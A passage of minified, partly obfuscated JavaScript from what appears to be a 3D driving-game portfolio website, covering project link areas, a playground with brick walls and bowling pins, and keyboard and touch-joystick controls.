_0x23cedf=_0x469c73,_0x29f714=_0x511969,_0x3d3565=_0x469c73,_0x336dea=_0x2dc8b1,_0x5e3338=_0xc8fe86,_0x39b2f3=_0x49af61,_0x1957a7=_0x45e389,_0x3d1efc=_0x4b36d8,_0x5c1c5d=_0x25412a,_0x104d2b=_0x4b36d8,_0x433a07={'vKGAO':function(_0x5e7a8f,_0x1da84d){var _0xc66a1=haydata_0x10aa;return _0xdfcf85[_0xc66a1('0x201')+'xy'](_0x5e7a8f,_0x1da84d)},'ZeQrT':function(_0x191e58,_0x152f53){var _0x2e2718=haydata_0x10aa;return _0xdfcf85[_0x2e2718('0x201')+'xy'](_0x191e58,_0x152f53)},'vNUZk':_0xdfcf85[_0x39b2f3('0x1c1')+'Xw'],'vUYas':_0xdfcf85[_0x23cedf('0x194','k^%E')+'bN'],'AwBZD':function(_0x196679,_0x1f4b85){var _0x554c1c=_0x23cedf;return _0xdfcf85[_0x554c1c('0x249','YaJJ')+'lh'](_0x196679,_0x1f4b85)},'TtGtr':function(_0x2e808c,_0x596fbc){var _0x19edff=_0x23cedf;return _0xdfcf85[_0x19edff(0x184,'kA%8')+'wi'](_0x2e808c,_0x596fbc)},'qFeBX':_0xdfcf85[_0x29f714(0x256,'Eg&q')+'nE'],'MJtrQ':function(_0x28148e,_0x3fbf79){var _0x3866a9=_0x39b2f3;return _0xdfcf85[_0x3866a9(0x26a)+'cT'](_0x28148e,_0x3fbf79)},'EefYK':_0xdfcf85[_0x23cedf('0x1b0','eq6@')+'vd'],'Ojzpx':_0xdfcf85[_0x39b2f3('0x1cd')+'VR']};if(_0xdfcf85[_0x23cedf('0x1e6','F*!(')+'fp'](_0xdfcf85[_0x5e3338(0x273,'#a%#')+'RK'],_0xdfcf85[_0x5e3338(0x242,'tjuo')+'Cg'])){var _0x2ce500=_0x433a07[_0x1957a7('0x186')+'AO'](_0x433a07[_0x39b2f3(0x191)+'rT'](_0x433a07[_0x5c1c5d('0x1c9')+'Zk'],[_0x4c6352]),_0x433a07[_0x5e3338('0x277','jof]')+'as']);_0x3b6ce7=_0x3fa396[_0x1957a7('0x22f')+_0x1957a7(0x20a)]({'href':_0x1b167b[_0x1957a7(0x200)+_0x104d2b(0x1ee)+'a'][_0x104d2b('0x236')+_0x1957a7('0x1f0')+_0x39b2f3('0x199')+_0x336dea('0x24c','&Y%v')+_0x23cedf('0x279','#SY7')][_0x451eb2][_0x29f714(0x247,'8jz#')+'f'],'labelTexture':_0x433a07[_0x336dea('0x202','tjuo')+'ZD'](_0x5603b9,_0x2ce500)})}else{var _0x4dc148=!![];return function(_0x2e7467,_0x15cc5c){var _0x5720c1=_0x104d2b,_0x330ae=_0x336dea,_0xf20f27=_0x3d3565,_0x59aea5=_0x5e3338,_0x371deb={'XzwQQ':_0xdfcf85[_0x330ae('0x237','ntXz')+'Tb'],'RuEWM':function(_0x3de871,_0x4643b7){var _0x1aa8a5=haydata_0x10aa;return _0xdfcf85[_0x1aa8a5('0x252')+'Dn'](_0x3de871,_0x4643b7)}};if(_0xdfcf85[_0xf20f27(0x225,'^Y*e')+'fp'](_0xdfcf85[_0x5720c1('0x215')+'Ti'],_0xdfcf85[_0x330ae(0x197,'kA%8')+'qv'])){if(_0x256dcc)throw _0x4cbe68;}else{var _0x2d3c40=_0x4dc148?function(){var _0x3a140e=_0x5720c1,_0x302dd8=_0x5720c1,_0x55ade6=_0x5720c1,_0x2d97e1=_0x5720c1,_0x58913c=_0x5720c1,_0x5e993f=_0x330ae,_0x9ab3c3=_0x59aea5,_0x43c288=_0xf20f27,_0x1c1981=_0xf20f27,_0xa37434=_0x59aea5;if(_0x433a07[_0x5e993f('0x1e2','Eg&q')+'tr'](_0x433a07[_0x5e993f('0x253','3MTv')+'BX'],_0x433a07[_0x3a140e(0x257)+'BX']))return _0x4d9616[_0x3a140e(0x22e)+_0x43c288('0x17e','c[dP')+'ng']()[_0x3a140e(0x1d6)+_0x302dd8('0x268')](WejdxW[_0x1c1981(0x1b7,'tjuo')+'QQ'])[_0x302dd8(0x22e)+_0x55ade6(0x1dc)+'ng']()[_0x302dd8(0x22f)+_0x55ade6(0x260)+_0x43c288(0x1df,'x9S7')+'or'](_0x4426b1)[_0x302dd8(0x1d6)+_0x302dd8('0x268')](WejdxW[_0x55ade6(0x185)+'QQ']);else{if(_0x15cc5c){if(_0x433a07[_0x2d97e1(0x240)+'rQ'](_0x433a07[_0x3a140e(0x23f)+'YK'],_0x433a07[_0x1c1981('0x275','#a%#')+'px'])){var _0x193fa7=_0x15cc5c[_0x3a140e('0x1a1')+'ly'](_0x2e7467,arguments);return _0x15cc5c=null,_0x193fa7}else try{_0x33ccf3||_0x371deb[_0x3a140e('0x258')+'WM'](null,_0x325c08[_0x1c1981('0x20c','pRG%')+_0x5e993f(0x226,'A1EW')])||_0x387d1d[_0x5e993f(0x1d5,'gt#s')+_0x302dd8(0x1ab)]()}finally{if(_0x2912b1)throw _0x53231b;}}}}:function(){};return _0x4dc148=![],_0x2d3c40}}}}(),_0x2812b8=_0xdfcf85[_0x160511('0x1d3')+'Uc'](_0x422e42,this,function(){var _0x55eda2=_0x556996,_0x22f1c1=_0xc8fe86,_0xb5105a=_0xc8fe86,_0x4098c1=_0x469c73,_0x12c687=_0x469c73,_0x3fc75b=_0x4b36d8,_0x58b9a1=_0x4b36d8,_0x33c8ea=_0x45e389,_0x40bdbd=_0x45e389,_0x4859e4=_0x160511,_0x4d83dc={};_0x4d83dc[_0x3fc75b('0x1ce')+'Nf']=_0xdfcf85[_0x58b9a1(0x188)+'ex'];var _0x125689=_0x4d83dc;if(_0xdfcf85[_0x55eda2('0x1a5','x9S7')+'oq'](_0xdfcf85[_0x55eda2('0x27e','QfYF')+'qb'],_0xdfcf85[_0x58b9a1(0x178)+'qb']))return _0x2812b8[_0x3fc75b(0x22e)+_0xb5105a(0x206,'9V[B')+'ng']()[_0x33c8ea('0x1d6')+_0x22f1c1(0x220,'x9S7')](_0xdfcf85[_0x33c8ea('0x270')+'Tb'])[_0x4098c1('0x1d1','sM(w')+_0x12c687('0x18e','F*!(')+'ng']()[_0x4859e4('0x22f')+_0x3fc75b(0x260)+_0x4859e4(0x262)+'or'](_0x2812b8)[_0xb5105a(0x1eb,'wL)r')+_0x4098c1(0x281,'#a%#')](_0xdfcf85[_0x55eda2(0x232,'9V[B')+'Tb']);else _0x2651a3[_0x4859e4('0x251')+'n'](_0x15c616[_0x22f1c1('0x231','x9S7')+'f'],_0x125689[_0x58b9a1(0x1ce)+'Nf'])});_0xdfcf85[_0x160511('0x17f')+'bo'](_0x2812b8);var _0x3e63b8=o[_0x160511(0x1b8)+'ue'],_0x155819={};_0x155819['x']=_0xdfcf85[_0x511969('0x280','8yag')+'xy'](_0xdfcf85[_0x511969('0x196','#SY7')+'gf'](e['x'],e[_0x511969(0x254,'1[YK')+'ks']['x']),_0xdfcf85[_0xc8fe86(0x25f,'H]ym')+'zJ'](e[_0x25412a('0x1c4')+'ks'][_0x49af61(0x265)+_0x25412a(0x23c)+_0x511969('0x19a','Eg&q')+_0x2dc8b1('0x1b3','pRG%')+_0x556996(0x286,'tjuo')],t)),_0x155819['y']=_0xdfcf85[_0xc8fe86('0x272','H]ym')+'TZ'](e['y'],e[_0x511969(0x1c8,'kA%8')+'ks']['y']),_0x155819[_0x511969('0x234','J*Sg')+'f']=_0x3e63b8[_0x160511('0x1a2')+'f'],_0x155819[_0x469c73('0x1db','&WpX')+'a']=e[_0x25412a('0x26f')+'as'][_0x2dc8b1(0x1e9,'j7Dt')]({'position':new f(_0x155819['x'],_0x155819['y']),'halfExtents':new f(e[_0x556996(0x205,'YaJJ')+'ks'][_0xc8fe86('0x20e','H]ym')+_0x511969('0x24f','tjuo')+_0x4b36d8('0x1a8')+'ts']['x'],e[_0x2dc8b1(0x1e4,'tjuo')+'ks'][_0x25412a(0x274)+_0x2dc8b1('0x222','A1EW')+_0xc8fe86(0x207,'&WpX')+'ts']['y'])}),_0x155819[_0x25412a('0x26f')+'a']['on'](_0xdfcf85[_0x4b36d8(0x278)+'Ff'],function(){var _0x31a5a9=_0x160511,_0x3940a9=_0x4b36d8,_0xf2b7c9=_0x25412a,_0x134bcb=_0x160511,_0xab75f5=_0x2dc8b1,_0x3e88a7=_0x2dc8b1,_0x29cd52=_0xc8fe86;if(_0xdfcf85[_0xab75f5('0x183','4]Xc')+'ny'](_0xdfcf85[_0x31a5a9('0x23d')+'tF'],_0xdfcf85[_0x31a5a9(0x23d)+'tF'])){var _0x4aaf0e=_0x23db46[_0x31a5a9(0x1a1)+'ly'](_0x5ab89c,arguments);return _0x11a20a=null,_0x4aaf0e}else window[_0x3e88a7('0x1a4','H]ym')+'n'](_0x3e63b8[_0xf2b7c9('0x1a2')+'f'],_0xdfcf85[_0x29cd52('0x243','np1C')+'ex'])}),_0x155819[_0xc8fe86(0x187,'Eg&q')+_0x45e389(0x1d9)+'e']=_0x3e63b8[_0x45e389(0x1bb)+_0x45e389(0x17c)+_0x160511(0x21a)+_0x2dc8b1('0x19c','pRG%')],_0x155819[_0x25412a('0x233')+_0xc8fe86(0x1e0,'!wXs')+'e'][_0x25412a('0x1e3')+_0x556996('0x1f7','!wXs')+_0x49af61('0x238')]=0x25*0x8c+-0xc95+-0x3bc*0x1,_0x155819[_0xc8fe86(0x187,'Eg&q')+_0x556996('0x1e8','aQ6I')+'e'][_0x469c73('0x1b1','wL)r')+_0x469c73('0x26b','^Y*e')+_0xc8fe86(0x18a,'if(q')]=0x11d7*-0x1+0xcbf*-0x1+0x8a1*0x4,_0x155819[_0x4b36d8(0x1bb)+_0xc8fe86('0x1be','frLt')+_0x2dc8b1(0x211,'&WpX')]=new Lt(e[_0x556996(0x1a7,'!wXs')+'ks'][_0x45e389('0x1bb')+_0xc8fe86('0x245','jof]')+_0x556996(0x25c,'xj5v')+_0x4b36d8('0x203')+'y'],new qe({'wireframe':!(0x221c*0x1+-0x774+-0x1aa7*0x1),'color':0xffffff,'alphaMap':_0x3e63b8[_0x4b36d8('0x1bb')+_0x469c73(0x1e7,'gq&g')+_0x469c73('0x255','j7Dt')+_0x511969(0x212,'x9S7')],'depthTest':!(0xca0+-0x1*0x2395+0x16f5),'depthWrite':!(-0x95*-0x2+0x120+-0x249),'transparent':!(-0x1dd7+0x1c26+0x1b1*0x1)})),_0x155819[_0x511969('0x1b9','gq&g')+_0x25412a(0x22b)+_0x469c73('0x230','8*ET')][_0x511969('0x1fa','j#Rl')+_0x45e389(0x24b)+'on']['x']=_0xdfcf85[_0xc8fe86(0x20d,'#a%#')+'Ec'](_0xdfcf85[_0x25412a('0x21e')+'TZ'](_0x155819['x'],_0xdfcf85[_0x556996('0x25d','eJHj')+'jy'](0x15f7+-0x4a8+-0x114f+0.5,e[_0x511969('0x1cb','eq6@')+'ks'][_0x160511('0x1bb')+_0x4b36d8('0x1dd')+_0x2dc8b1(0x27b,'9V[B')+'h'])),e[_0x556996(0x282,'gq&g')+'ks'][_0x4b36d8(0x274)+_0x469c73(0x26c,'Eg&q')+_0x25412a(0x1a8)+'ts']['x']),_0x155819[_0x45e389('0x1bb')+_0x4b36d8(0x22b)+_0x160511(0x19b)][_0x469c73(0x25a,'QfYF')+_0x511969(0x204,'8*ET')+'on']['y']=_0xdfcf85[_0x469c73('0x272','H]ym')+'TZ'](_0x155819['y'],e[_0x160511('0x1c4')+'ks'][_0x2dc8b1(0x1f9,'^Y*e')+_0x49af61('0x1d2')+_0x469c73(0x27c,'A1EW')+'et']),_0x155819[_0x2dc8b1(0x208,'c[dP')+_0xc8fe86(0x228,'YaJJ')+_0x25412a('0x19b')][_0x556996(0x209,'frLt')+_0x160511(0x1da)+_0x511969('0x179','&Y%v')+_0x556996(0x1f8,'&Y%v')+_0x45e389(0x1ee)+'e']=!(-0xed7*0x1+-0x4*-0x571+0x2*-0x376),_0x155819[_0x4b36d8('0x1bb')+_0x25412a(0x22b)+_0x469c73(0x224,'QfYF')][_0x511969(0x1ba,'4]Xc')+_0x49af61(0x23a)+_0xc8fe86('0x1b4','J*Sg')+_0x469c73(0x17a,'sM(w')](),e[_0x4b36d8('0x1c4')+'ks'][_0x2dc8b1('0x24e','gq&g')+_0x160511('0x1ca')+_0x2dc8b1('0x223','^Y*e')][_0x4b36d8(0x1bc)](_0x155819[_0x45e389(0x1bb)+_0x45e389(0x22b)+_0x556996('0x1ff','ntXz')]),e[_0x2dc8b1(0x248,'QfYF')+'ks'][_0x25412a(0x1d8)+'ms'][_0xc8fe86('0x250','Zam#')+'h'](_0x155819),t++},s=this[haydata_0x114357(0x1c4)+'ks'][haydata_0x231198('0x1ac','if(q')+haydata_0x229a4f(0x267,'OZT[')+'s'][Symbol[haydata_0x46a597('0x1d8')+haydata_0x114357(0x1a0)+'or']]();!(i=(o=s[haydata_0x114357('0x1f6')+'t']())[haydata_0x46a597('0x1d4')+'e']);i=!(0x11d4+-0x52*-0x59+0xf72*-0x3))a()}catch(haydata_0x546972){n=!(0x1be*0xa+0x183f+0x1*-0x29ab),r=haydata_0x546972}finally{try{i||null==s[haydata_0x231198('0x21c','ntXz')+haydata_0x114357('0x1ab')]||s[haydata_0x4d174(0x263)+haydata_0x4d174(0x1ab)]()}finally{if(n)throw r;}}}},{key:"setActivities",value:function(){this.activities={},this.activities.x=this.x+0,this.activities.y=this.y-10,this.activities.multiplier=5.5,this.activities.geometry=new si(2*this.activities.multiplier,1*this.activities.multiplier,1,1),this.activities.texture=this.resources.items.informationActivitiesTexture,this.activities.texture.magFilter=1003,this.activities.texture.minFilter=1006,this.activities.material=new qe({wireframe:!1,color:16777215,alphaMap:this.activities.texture,transparent:!0}),this.activities.mesh=new Lt(this.activities.geometry,this.activities.material),this.activities.mesh.position.x=this.activities.x,this.activities.mesh.position.y=this.activities.y,this.activities.mesh.matrixAutoUpdate=!1,this.activities.mesh.updateMatrix(),this.container.add(this.activities.mesh)}},{key:"setTiles",value:function(){this.tiles.add({start:new f(this.x-1.2,this.y+13),delta:new f(0,-20)})}}])&&Xd(t.prototype,i),n&&Xd(t,n),e}();function Zd(e,t){for(var i=0;i<t.length;i++){var n=t[i];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}var Qd=function(){function e(t){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e),this.time=t.time,this.resources=t.resources,this.objects=t.objects,this.areas=t.areas,this.walls=t.walls,this.tiles=t.tiles,this.debug=t.debug,this.x=t.x,this.y=t.y,this.debug&&(this.debugFolder=this.debug.addFolder("playgroundSection")),this.container=new K,this.container.matrixAutoUpdate=!1,this.resources.items.areaResetTexture.magFilter=1003,this.resources.items.areaResetTexture.minFilter=1006,this.setStatic(),this.setBricksWalls(),this.setBowling()}var t,i,n;return t=e,(i=[{key:"setStatic",value:function(){this.objects.add({base:this.resources.items.playgroundStaticBase.scene,collision:this.resources.items.playgroundStaticCollision.scene,floorShadowTexture:this.resources.items.playgroundStaticFloorShadowTexture,offset:new y(this.x,this.y,0),mass:0})}},{key:"setBricksWalls",value:function(){var e=this;this.brickWalls={},this.brickWalls.x=this.x+15,this.brickWalls.y=this.y+14,this.brickWalls.items=[],this.brickWalls.brickOptions={base:this.resources.items.brickBase.scene,collision:this.resources.items.brickCollision.scene,offset:new y(0,0,.1),rotation:new F(0,0,0),duplicated:!0,shadow:{sizeX:1.2,sizeY:1.8,offsetZ:-.15,alpha:.35},mass:.5,soundName:"brick"},this.brickWalls.items.push(this.walls.add({object:this.brickWalls.brickOptions,shape:{type:"rectangle",widthCount:5,heightCount:6,position:new y(this.brickWalls.x-6,this.brickWalls.y,0),offsetWidth:new y(0,1.05,0),offsetHeight:new y(0,0,.45),randomOffset:new y(0,0,0),randomRotation:new y(0,0,.4)}}),this.walls.add({object:this.brickWalls.brickOptions,shape:{type:"brick",widthCount:5,heightCount:6,position:new y(this.brickWalls.x-12,this.brickWalls.y,0),offsetWidth:new y(0,1.05,0),offsetHeight:new y(0,0,.45),randomOffset:new y(0,0,0),randomRotation:new y(0,0,.4)}}),this.walls.add({object:this.brickWalls.brickOptions,shape:{type:"triangle",widthCount:6,position:new y(this.brickWalls.x-18,this.brickWalls.y,0),offsetWidth:new y(0,1.05,0),offsetHeight:new y(0,0,.45),randomOffset:new y(0,0,0),randomRotation:new y(0,0,.4)}})),this.brickWalls.reset=function(){var t=!0,i=!1,n=void 0;try{for(var r,o=e.brickWalls.items[Symbol.iterator]();!(t=(r=o.next()).done);t=!0){var a=r.value,s=!0,c=!1,l=void 0;try{for(var h,u=a.items[Symbol.iterator]();!(s=(h=u.next()).done);s=!0)h.value.collision.reset()}catch(e){c=!0,l=e}finally{try{s||null==u.return||u.return()}finally{if(c)throw l}}}}catch(e){i=!0,n=e}finally{try{t||null==o.return||o.return()}finally{if(i)throw n}}},this.brickWalls.resetArea=this.areas.add({position:new f(this.brickWalls.x,this.brickWalls.y),halfExtents:new f(2,2)}),this.brickWalls.resetArea.on("interact",(function(){e.brickWalls.reset()})),this.brickWalls.areaLabelMesh=new Lt(new si(2,.5),new qe({transparent:!0,depthWrite:!1,color:16777215,alphaMap:this.resources.items.areaResetTexture})),this.brickWalls.areaLabelMesh.position.x=this.brickWalls.x,this.brickWalls.areaLabelMesh.position.y=this.brickWalls.y,this.brickWalls.areaLabelMesh.matrixAutoUpdate=!1,this.brickWalls.areaLabelMesh.updateMatrix(),this.container.add(this.brickWalls.areaLabelMesh),this.debugFolder&&this.debugFolder.add(this.brickWalls,"reset").name("brickWalls reset")}},{key:"setBowling",value:function(){var e=this;this.bowling={},this.bowling.x=this.x+15,this.bowling.y=this.y+4,this.bowling.pins=this.walls.add({object:{base:this.resources.items.bowlingPinBase.scene,collision:this.resources.items.bowlingPinCollision.scene,offset:new y(0,0,.1),rotation:new F(0,0,0),duplicated:!0,shadow:{sizeX:1.4,sizeY:1.4,offsetZ:-.15,alpha:.35},mass:.1,soundName:"bowlingPin"},shape:{type:"triangle",widthCount:4,position:new y(this.bowling.x-25,this.bowling.y,0),offsetWidth:new y(0,1,0),offsetHeight:new y(.65,0,0),randomOffset:new y(0,0,0),randomRotation:new y(0,0,0)}}),this.bowling.ball=this.objects.add({base:this.resources.items.bowlingBallBase.scene,collision:this.resources.items.bowlingBallCollision.scene,offset:new y(this.bowling.x-5,this.bowling.y,0),rotation:new F(.5*Math.PI,0,0),duplicated:!0,shadow:{sizeX:1.5,sizeY:1.5,offsetZ:-.15,alpha:.35},mass:1,soundName:"bowlingBall"}),this.bowling.reset=function(){var t=!0,i=!1,n=void 0;try{for(var r,o=e.bowling.pins.items[Symbol.iterator]();!(t=(r=o.next()).done);t=!0)r.value.collision.reset()}catch(e){i=!0,n=e}finally{try{t||null==o.return||o.return()}finally{if(i)throw n}}e.bowling.ball.collision.reset()},this.bowling.resetArea=this.areas.add({position:new f(this.bowling.x,this.bowling.y),halfExtents:new f(2,2)}),this.bowling.resetArea.on("interact",(function(){e.bowling.reset()})),this.bowling.areaLabelMesh=new Lt(new si(2,.5),new qe({transparent:!0,depthWrite:!1,color:16777215,alphaMap:this.resources.items.areaResetTexture})),this.bowling.areaLabelMesh.position.x=this.bowling.x,this.bowling.areaLabelMesh.position.y=this.bowling.y,this.bowling.areaLabelMesh.matrixAutoUpdate=!1,this.bowling.areaLabelMesh.updateMatrix(),this.container.add(this.bowling.areaLabelMesh),this.debugFolder&&this.debugFolder.add(this.bowling,"reset").name("bowling reset")}}])&&Zd(t.prototype,i),n&&Zd(t,n),e}(),$d=i.p+"static/images/0d610daf67902cdb0c8f7a936d11a961.png",Jd=i.p+"static/images/00a7e92cbdac1c30d8e13460d27109df.png",Kd=i.p+"static/images/0f8ce1c14302bac5ce715ecd9cf16340.png";function ep(e){return(ep="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e})(e)}function tp(e){return function(e){if(Array.isArray(e)){for(var t=0,i=new Array(e.length);t<e.length;t++)i[t]=e[t];return i}}(e)||function(e){if(Symbol.iterator in Object(e)||"[object Arguments]"===Object.prototype.toString.call(e))return Array.from(e)}(e)||function(){throw new TypeError("Invalid attempt to spread non-iterable instance")}()}function ip(e,t){for(var i=0;i<t.length;i++){var n=t[i];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}function np(e,t){return!t||"object"!==ep(t)&&"function"!=typeof t?function(e){if(void 0===e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return e}(e):t}function rp(e){return(rp=Object.setPrototypeOf?Object.getPrototypeOf:function(e){return e.__proto__||Object.getPrototypeOf(e)})(e)}function op(e,t){return(op=Object.setPrototypeOf||function(e,t){return e.__proto__=t,e})(e,t)}var ap=function(e){function t(e){var i;return function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t),(i=np(this,rp(t).call(this))).config=e.config,i.sizes=e.sizes,i.time=e.time,i.camera=e.camera,i.sounds=e.sounds,i.setActions(),i.setKeyboard(),i}var i,n,r;return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function");e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,writable:!0,configurable:!0}}),t&&op(e,t)}(t,e),i=t,(n=[{key:"setActions",value:function(){var e=this;this.actions={},this.actions.up=!1,this.actions.right=!1,this.actions.down=!1,this.actions.left=!1,this.actions.brake=!1,this.actions.boost=!1,document.addEventListener("visibilitychange",(function(){document.hidden||(e.actions.up=!1,e.actions.right=!1,e.actions.down=!1,e.actions.left=!1,e.actions.brake=!1,e.actions.boost=!1)}))}},{key:"setKeyboard",value:function(){var e=this;this.keyboard={},this.keyboard.events={},this.keyboard.events.keyDown=function(t){switch(t.key){case"ArrowUp":case"z":case"w":e.camera.pan.reset(),e.actions.up=!0;break;case"ArrowRight":case"d":e.actions.right=!0;break;case"ArrowDown":case"s":e.camera.pan.reset(),e.actions.down=!0;break;case"ArrowLeft":case"q":case"a":e.actions.left=!0;break;case"Control":case" ":e.actions.brake=!0;break;case"Shift":e.actions.boost=!0}},this.keyboard.events.keyUp=function(t){switch(t.key){case"ArrowUp":case"z":case"w":e.actions.up=!1;break;case"ArrowRight":case"d":e.actions.right=!1;break;case"ArrowDown":case"s":e.actions.down=!1;break;case"ArrowLeft":case"q":case"a":e.actions.left=!1;break;case"Control":case" ":e.actions.brake=!1;break;case"Shift":e.actions.boost=!1;break;case"r":e.trigger("action",["reset"])}},document.addEventListener("keydown",this.keyboard.events.keyDown),document.addEventListener("keyup",this.keyboard.events.keyUp)}},{key:"setTouch",value:function(){var e=this;this.touch={},this.touch.joystick={},this.touch.joystick.active=!1,this.touch.joystick.$element=document.createElement("div"),this.touch.joystick.$element.style.userSelect="none",this.touch.joystick.$element.style.position="fixed",this.touch.joystick.$element.style.bottom="10px",this.touch.joystick.$element.style.left="10px",this.touch.joystick.$element.style.width="170px",this.touch.joystick.$element.style.height="170px",this.touch.joystick.$element.style.borderRadius="50%",this.touch.joystick.$element.style.transition="opacity 0.3s 0.0s",this.touch.joystick.$element.style.willChange="opacity",this.touch.joystick.$element.style.opacity="0",document.body.appendChild(this.touch.joystick.$element),this.touch.joystick.$cursor=document.createElement("div"),this.touch.joystick.$cursor.style.position="absolute",this.touch.joystick.$cursor.style.top="calc(50% - 30px)",this.touch.joystick.$cursor.style.left="calc(50% - 30px)",this.touch.joystick.$cursor.style.width="60px",this.touch.joystick.$cursor.style.height="60px",this.touch.joystick.$cursor.style.border="2px solid #ffffff",this.touch.joystick.$cursor.style.borderRadius="50%",this.touch.joystick.$cursor.style.boxSizing="border-box",this.touch.joystick.$cursor.style.pointerEvents="none",this.touch.joystick.$cursor.style.willChange="transform",this.touch.joystick.$element.appendChild(this.touch.joystick.$cursor),this.touch.joystick.$limit=document.createElement("div"),this.touch.joystick.$limit.style.position="absolute",this.touch.joystick.$limit.style.top="calc(50% - 75px)",this.touch.joystick.$limit.style.left="calc(50% - 75px)",this.touch.joystick.$limit.style.width="150px",this.touch.joystick.$limit.style.height="150px",this.touch.joystick.$limit.style.border="2px solid #ffffff",this.touch.joystick.$limit.style.borderRadius="50%",this.touch.joystick.$limit.style.opacity="0.25",this.touch.joystick.$limit.style.pointerEvents="none",this.touch.joystick.$limit.style.boxSizing="border-box",this.touch.joystick.$element.appendChild(this.touch.joystick.$limit),this.touch.joystick.angle={},this.touch.joystick.angle.offset=.18*Math.PI,this.touch.joystick.angle.center={},this.touch.joystick.angle.center.x=0,this.touch.joystick.angle.center.y=0,this.touch.joystick.angle.current={},this.touch.joystick.angle.current.x=0,this.touch.joystick.angle.current.y=0,this.touch.joystick.angle.originalValue=0,this.touch.joystick.angle.value=.5*-Math.PI,this.touch.joystick.resize=function(){var t=e.touch.joystick.$element.getBoundingClientRect();e.touch.joystick.angle.center.x=t.left+.5*t.width,e.touch.joystick.angle.center.y=t.top+.5*t.height},this.sizes.on("resize",this.touch.joystick.resize),this.touch.joystick.resize(),this.time.on("tick",(function(){if(e.touch.joystick.active){e.touch.joystick.angle.originalValue=-Math.atan2(e.touch.joystick.angle.current.y-e.touch.joystick.angle.center.y,e.touch.joystick.angle.current.x-e.touch.joystick.angle.center.x),e.touch.joystick.angle.value=e.touch.joystick.angle.originalValue+e.touch.joystick.angle.offset;var t=Math.hypot(e.touch.joystick.angle.current.y-e.touch.joystick.angle.center.y,e.touch.joystick.angle.current.x-e.touch.joystick.angle.center.x),i=t;i>20&&(i=20+5*Math.log(t-20)),i>43&&(i=43);var n=Math.sin(e.touch.joystick.angle.originalValue+.5*Math.PI)*i,r=Math.cos(e.touch.joystick.angle.originalValue+.5*Math.PI)*i;e.touch.joystick.$cursor.style.transform="translateX(".concat(n,"px) translateY(").concat(r,"px)")}})),this.touch.joystick.events={},this.touch.joystick.touchIdentifier=null,this.touch.joystick.events.touchstart=function(t){t.preventDefault();var i=t.changedTouches[0];i&&(e.touch.joystick.active=!0,e.touch.joystick.touchIdentifier=i.identifier,e.touch.joystick.angle.current.x=i.clientX,e.touch.joystick.angle.current.y=i.clientY,e.touch.joystick.$limit.style.opacity="0.5",document.addEventListener("touchend",e.touch.joystick.events.touchend),document.addEventListener("touchmove",e.touch.joystick.events.touchmove,{passive:!1}),e.trigger("joystickStart"))},this.touch.joystick.events.touchmove=function(t){t.preventDefault();var i=tp(t.changedTouches).find((function(t){return t.identifier===e.touch.joystick.touchIdentifier}));i&&(e.touch.joystick.angle.current.x=i.clientX,e.touch.joystick.angle.current.y=i.clientY,e.trigger("joystickMove"))},this.touch.joystick.events.touchend=function(t){tp(t.changedTouches).find((function(t){return t.identifier===e.touch.joystick.touchIdentifier}))&&(e.touch.joystick.active=!1,e.touch.joystick.$limit.style.opacity="0.25",e.touch.joystick.$cursor.style.transform="translateX(0px) translateY(0px)",document.removeEventListener("touchend",e.touch.joystick.events.touchend),e.trigger("joystickEnd"))},this.touch.joystick.$element.addEventListener("touchstart",this.touch.joystick.events.touchstart,{passive:!1}),this.touch.boost={},this.touch.boost.$element=document.createElement("div"),this.touch.boost.$element.style.userSelect="none",this.touch.boost.$element.style.position="fixed",this.touch.boost.$element.style.bottom="calc(70px * 3 + 15px)",this.touch.boost.$element.style.right="0px",this.touch.boost.$element.style.width="95px",this.touch.boost.$element.style.height="70px",this.touch.boost.$element.style.transition="opacity 0.3s 0.4s",this.touch.boost.$element.style.willChange="opacity",this.touch.boost.$element.style.opacity="0",document.body.appendChild(this.touch.boost.$element),this.touch.boost.$border=document.createElement("div"),this.touch.boost.$border.style.position="absolute",this.touch.boost.$border.style.top="calc(50% - 30px)",this.touch.boost.$border.style.left="calc(50% - 30px)",this.touch.boost.$border.style.width="60px",this.touch.boost.$border.style.height="60px",this.touch.boost.$border.style.border="2px solid #ffffff",this.touch.boost.$border.style.borderRadius="10px",this.touch.boost.$border.style.boxSizing="border-box",this.touch.boost.$border.style.opacity="0.25",this.touch.boost.$border.style.willChange="opacity",this.touch.boost.$element.appendChild(this.touch.boost.$border),this.touch.boost.$icon=document.createElement("div"),this.touch.boost.$icon.style.position="absolute",this.touch.boost.$icon.style.top="calc(50% - 13px)",this.touch.boost.$icon.style.left="calc(50% - 11px)",this.touch.boost.$icon.style.width="22px",this.touch.boost.$icon.style.height="26px",this.touch.boost.$icon.style.backgroundImage="url(".concat($d,")"),this.touch.boost.$icon.style.backgroundSize="cover",this.touch.boost.$element.appendChild(this.touch.boost.$icon),this.touch.boost.events={},this.touch.boost.touchIdentifier=null,this.touch.boost.events.touchstart=function(t){t.preventDefault();var i=t.changedTouches[0];i&&(e.camera.pan.reset(),e.touch.boost.touchIdentifier=i.identifier,e.actions.up=!0,e.actions.boost=!0,e.touch.boost.$border.style.opacity="0.5",document.addEventListener("touchend",e.touch.boost.events.touchend))},this.touch.boost.events.touchend=function(t){tp(t.changedTouches).find((function(t){return t.identifier===e.touch.boost.touchIdentifier}))&&(e.actions.up=!1,e.actions.boost=!1,e.touch.boost.$border.style.opacity="0.25",document.removeEventListener("touchend",e.touch.boost.events.touchend))},this.touch.boost.$element.addEventListener("touchstart",this.touch.boost.events.touchstart),this.touch.forward={},this.touch.forward.$element=document.createElement("div"),this.touch.forward.$element.style.userSelect="none",this.touch.forward.$element.style.position="fixed",this.touch.forward.$element.style.bottom="calc(70px * 2 + 15px)",this.touch.forward.$element.style.right="0px",this.touch.forward.$element.style.width="95px",this.touch.forward.$element.style.height="70px",this.touch.forward.$element.style.transition="opacity 0.3s 